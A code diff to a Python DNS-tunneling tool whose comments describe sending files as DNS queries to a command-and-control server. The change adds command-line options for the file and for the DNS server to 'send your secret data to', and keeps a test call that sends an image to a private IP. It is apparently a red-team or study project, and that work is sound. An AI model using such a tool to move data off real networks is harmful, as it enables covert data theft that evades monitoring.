@@ -11,8 +11,7 @@ import dns.message
 import dns.asyncquery
 import dns.asyncresolver
 from dns.exception import Timeout
-import time
-# import requests
+import time, argparse
 
 file_uuid_str = f'{uuid.uuid4()}'
 def send_file_dns_over_udp(filename: str, dns_server: str):
@@ -58,7 +57,7 @@ def send_file_dns_over_udp(filename: str, dns_server: str):
     send_plaintext_query(query=finish_query,dns_server=dns_server)
 
     print("Done sending")
-    
+
 
 def send_plaintext_query(query: str, dns_server: str):
     """sends a query using the dnspython package to the c2 server. 
@@ -138,5 +137,12 @@ def send_file_dns_over_https(filename):
     send_query_dns_over_https(finish_query)
 
 if __name__ == "__main__":
+
+    ap = argparse.ArgumentParser()
+    ap.add_argument('-f', '--filename', dest='file_to_send', type=str, help='The file you want to send using DNS tunneling')
+    ap.add_argument('-d', '--dnsip' , dest="dns_server", type=str, help='The DNS server you want to send your secret data to.')
+
+    args = vars(ap.parse_args())
+    print(args)
+
     send_file_dns_over_udp(filename="smiley.jpg", dns_server="10.0.10.140")
-    #send_file_dns_over_https(filename="test_send.txt")
